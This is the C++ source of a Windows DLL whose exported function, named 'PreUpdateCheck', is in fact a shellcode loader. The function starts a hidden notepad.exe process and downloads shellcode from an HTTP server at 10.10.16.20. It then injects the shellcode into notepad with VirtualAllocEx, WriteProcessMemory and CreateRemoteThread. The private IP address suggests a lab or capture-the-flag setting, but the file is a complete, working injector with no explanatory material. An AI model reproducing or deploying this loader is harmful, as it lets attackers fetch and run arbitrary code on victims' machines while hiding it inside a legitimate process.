// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <vector>
#include <Windows.h>
#include <winhttp.h>
#include <iostream>


#pragma comment(lib, "winhttp.lib")
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename, LPCWSTR scheme);


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int PreUpdateCheck()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        startup_info,
        process_info);


    std::vector<BYTE> shellcode = Download(L"10.10.16.20\0", L"/shellcode.bin\0", L"http\0");

    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    SIZE_T bytesWritten;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten
    );

    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        process_info->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId
    );

    //close handles
    CloseHandle(hThread);
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);

    return 0;

}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename, LPCWSTR scheme) {
    if (scheme != L"https\0" && scheme != L"http\0") {
        throw std::invalid_argument("Unrecognized scheme.");
    }


    // initialise session
    HINTERNET hSession;
    if (scheme == L"https\0") {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
    }
    else {
        hSession = WinHttpOpen(
            NULL,
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
    }

    // create session for target
    HINTERNET hConnect;
    if (scheme == L"https\0") {
        hConnect = WinHttpConnect(
            hSession,
            baseAddress,
            INTERNET_DEFAULT_HTTPS_PORT,            // port 443
            0);
    }
    else {
        hConnect = WinHttpConnect(
            hSession,
            baseAddress,
            INTERNET_DEFAULT_HTTP_PORT,            // port 80
            0);
    }

    // create request handle
    HINTERNET hRequest;
    if (scheme == L"https\0") {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            filename,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);                   // ssl
    }
    else {
        hRequest = WinHttpOpenRequest(
            hConnect,
            L"GET",
            filename,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);                   // ssl
    }

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}